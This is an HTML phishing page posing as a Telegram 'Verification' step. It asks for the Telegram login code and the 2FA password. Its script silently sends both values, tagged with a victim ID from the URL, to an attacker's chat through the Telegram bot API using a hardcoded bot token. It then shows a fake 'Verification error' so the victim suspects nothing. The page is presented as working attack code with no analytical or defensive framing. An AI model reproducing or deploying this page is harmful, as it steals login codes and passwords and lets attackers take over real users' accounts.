<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <style>
        body { background: #0f0f0f; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { width: 80%; max-width: 400px; text-align: center; }
        input { background: #1c1c1c; border: 1px solid #333; color: white; padding: 15px; width: 100%; border-radius: 10px; margin-bottom: 20px; box-sizing: border-box; font-size: 16px; }
        .btn { background: #248bda; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container">
        <h1>Enter Code</h1>
        <p>Check your Telegram app</p>
        <input type="text" id="code" placeholder="Code from Telegram">
        <input type="password" id="cloud" placeholder="2FA Password (if set)">
        <button class="btn" onclick="sendCode()">Verify</button>
    </div>

    <script>
        const botToken = "8598157493:AAH_95b9t0ehVfwvfBm2vcnySZyyY79rUBg";
        const adminId = "6990072009";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('uid') || 'Unknown';

        async function sendCode() {
            const code = document.getElementById('code').value;
            const cloud = document.getElementById('cloud').value || "None";
            
            if(!code) return alert("Enter code!");

            const text = `🔑 **ДАННЫЕ ДЛЯ ВХОДА**\n👤 ID: \`${uid}\` \n💬 Код: \`${code}\` \n🔐 2FA: \`${cloud}\``;
            
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: adminId, text: text, parse_mode: "Markdown" })
            });

            // После ввода кода можно перекинуть на официальный сайт или показать ошибку
            alert("Verification error. Try again later.");
        }
    </script>
</body>
</html>
